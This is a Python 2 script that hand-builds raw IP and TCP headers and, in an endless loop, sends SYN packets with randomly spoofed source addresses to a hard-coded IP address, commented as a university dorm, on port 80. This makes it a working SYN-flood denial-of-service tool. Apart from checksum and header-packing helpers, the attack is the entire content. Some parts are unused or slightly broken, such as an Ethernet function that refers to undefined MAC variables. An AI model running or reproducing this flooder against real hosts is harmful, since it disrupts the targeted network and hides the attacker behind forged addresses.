# some imports
import socket, sys, binascii
from struct import *
from random import randint

# checksum functions needed for calculation checksum
def checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        #w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
        s = s + w

    s = (s>>16) + (s & 0xffff);
    s = s + (s >> 16);
    #complement and mask to 4 byte short
    s = ~s & 0xffff

    return s

def randomSrcPort():
    return randint(1025, 65535)

def randomSrcIP():
    return ''+str(randint(5, 200))+'.'+str(randint(5, 200))+'.'+str(randint(5, 200))+'.'+str(randint(5, 200))

#create a raw socket
try:
    # Open socket
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    #s= socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    # bind to the network card
    #s.bind(("wlp1s0", 0))
    #s.bind(("eth0", 0))
    # nonblocking: throws error if send() cant dispose data
    #s.setblocking(0)
except socket.error , msg:
    print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

# tell kernel not to put in headers, since we are providing it
#s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# now start constructing the packet
packet = '';
#source_ip = '192.168.1.101'         #spoofed IP address
dest_ip = '75.141.69.54'           # WWU dorm
#dest_ip = socket.gethostbyname('www.google.com')
#mac_dest = binascii.unhexlify('e4ce8f3cf7da')   #macaddress for my macbook
#mac_dest = binascii.unhexlify('ffffffffffff')   #broadcast
#mac_src = binascii.unhexlify('4c0bbe247fb0')    #macaddress for surface pro
#mac_src = binascii.unhexlify('e4ce8f3cf7da')    #macaddress for macbook
#mac_src = binascii.unhexlify('865848583828') #spoofed mac address

data = 'Client Hello'

def ethernet():
    ethernet_type = socket.htons( 0x0800) 
    ethernet_type = 0x0800 
    # 6s = 6 bytes of char[] 48 bits
    window = pack('!6s6sH', mac_dest, mac_src, ethernet_type)
    return window

def ip():
    # ip header fields
    ihl = 5             # header length '5' is 20 bytes 0101
    version = 4         # ipv4
    tos = 0             # type of service
    tot_len = 0         # total length (OS provides correct length) 
    id = 54321          # identification
    frag_off = 0        # fragment offset which includes flags
    ttl = 225           # time to live
    protocol = socket.IPPROTO_TCP   # protocol 
    check = 0          # header checksum (OS provides correct checksum)
    # following method converts ip string from dotted to 32-bit packed binary format
    saddr = socket.inet_aton ( source_ip )  #Spoof the source ip address if desired
    daddr = socket.inet_aton ( dest_ip )    # destination ip address
    
    # shift version by 4 bits and add that to the header length
    # this is because both of them combined are 8 bits in the IP header field
    ihl_version = (version << 4) + ihl

    # the ! in the pack format string means network order
    # B = 1 byte 8 bits unsigned char
    # H = 2 bytes 16 bits unsigned short
    # 4s = 32 bits 4 bytes 4*char[]
    datagram = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
    return datagram

def tcp():
    # tcp header fields
    source = randomSrcPort()  # get random src port number from 1200-65535
    dest = 80           # destination port
    seq = 454             # sequence number
    ack_seq = 0         # acknowledgement number
    doff = 5            # data offset && header length 
    offset_res = (doff << 4) + 0    # shift dof 4 bits
    #tcp flags
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    # tcp flag header, each flag is 1 bit
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    # method converts 16-bit positive integers to network byte order
    window = socket.htons (5840)    # maximum allowed window size
    check = 0           # checksum
    urg_ptr = 0         # urgent pointer

    # the ! in the pack format string means network order
    # B = 1 byte 8 bits unsigned char
    # H = 2 bytes 16 bits unsigned short
    # L = 4 bytes 32 bits unsigned long
    segment = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

    # pseudo header fields to compute checksum
    # following method converts ip string from dotted to 32-bit packed binary format
    source_address = socket.inet_aton( source_ip )
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(segment)+len(data)

    psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
    psh = psh+segment+data;
    # compute checksum
    tcp_checksum = checksum(psh)

    # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
    segment = pack('!HHLLBBH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window)+ pack('H', tcp_checksum) + pack('!H' , urg_ptr)
    return (segment+data)

def udp():
    # tcp header fields
    source = randomSrcPort()  # get random src port number from 1200-65535
    dest = 28010            # destination port
    length = 5              # header length
    check = 0                # checksum

    # the ! in the pack format string means network order
    # B = 1 byte 8 bits unsigned char
    # H = 2 bytes 16 bits unsigned short
    # L = 4 bytes 32 bits unsigned long
    segment = pack('!HHHH' , source, dest, length, check)

    # pseudo header fields to compute checksum
    # following method converts ip string from dotted to 32-bit packed binary format
    source_address = socket.inet_aton( source_ip )
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_UDP
    udp_length = len(segment)+len(data)

    psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , udp_length);
    psh = psh+segment+data;
    # compute checksum
    udp_checksum = checksum(psh)

    # make the tcp header again and fill the correct checksum
    segment = pack('!HHH' , source, dest, udp_length) + pack('H', udp_checksum)
    return (segment+data)

while True:
    source_ip = randomSrcIP()         #spoofed IP address
    print "Sending packet as "+str(source_ip)
    #window = ethernet()
    datagram = ip()
    segment = tcp()
    # final full packet - syn packets dont have any data
    packet = datagram + segment
    #packet = window+datagram + segment

    # Send the packet finally - the port specified has no effect
    s.sendto(packet, (dest_ip , 0 ))
#s.send(packet)
#s.close()
